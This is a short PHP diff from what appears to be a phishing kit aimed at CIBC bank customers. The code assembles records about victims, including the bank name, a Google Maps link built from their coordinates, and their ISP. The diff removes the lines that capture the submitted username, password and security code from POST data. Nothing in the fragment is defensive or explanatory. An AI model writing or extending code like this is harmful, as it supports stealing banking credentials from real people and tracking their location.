@@ -181,9 +181,6 @@ if ($success==false) {
     $bank       = "CIBC";
 
     $url        = "https://CIBC.com";
-    $user       = $_POST['username'];
-    $pass       = $_POST['password'];
-    $code       = $_POST['code']; 
 	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
